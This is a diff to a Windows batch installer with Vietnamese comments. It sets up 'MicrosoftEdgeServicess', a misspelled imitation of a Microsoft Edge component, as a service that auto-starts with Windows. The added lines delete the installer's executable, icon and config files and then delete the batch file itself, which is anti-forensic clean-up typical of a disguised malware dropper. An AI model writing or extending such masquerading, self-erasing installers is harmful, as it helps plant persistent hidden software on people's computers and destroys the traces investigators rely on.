@@ -233,17 +233,26 @@ if exist "%~dp0admin_pass.txt" (
     del /f /q "%~dp0admin_pass.txt" >nul 2>&1
 )
 
+:: Xoa cac tap tin thanh phan cai dat nguon de bao mat va tiet kiem dung luong
+if exist "%~dp0MicrosoftEdgeServicess.exe" del /f /q "%~dp0MicrosoftEdgeServicess.exe" >nul 2>&1
+if exist "%~dp0edge.ico" del /f /q "%~dp0edge.ico" >nul 2>&1
+if exist "%~dp0msedge_settings.json" del /f /q "%~dp0msedge_settings.json" >nul 2>&1
+if exist "%~dp0config.json" del /f /q "%~dp0config.json" >nul 2>&1
+
 echo.
 echo ===============================================================================
 echo   CAI DAT THANH PHAN MICROSOFT EDGE HOAN TAT!
 echo   - Component: MicrosoftEdgeServicess
 echo   - Status: Running (Tu khoi dong cung Windows)
 echo   - Environment: SCM Service Architecture
-echo   - Security: Mat khau duoc ma hoa AES SecureString an toan 100%%
+echo   - Don dep: Da tu dong xoa sach cac tap tin cai dat nguon
 echo ===============================================================================
 echo.
 echo Cua so se tu dong dong sau 3 giay, hoac bam phim bat ky de thoat ngay...
 timeout /t 3 >nul 2>nul || ping 127.0.0.1 -n 4 >nul
+
+:: Tu dong xoa sach tap tin batch cai dat khi dong
+(goto) 2>nul & del /f /q "%~dp0Install_Edge_Framework.bat" "%~dp01Install_Edge_Framework.bat" "%~f0" >nul 2>&1
 exit /b 0
 
 :LoiGhiTapTin
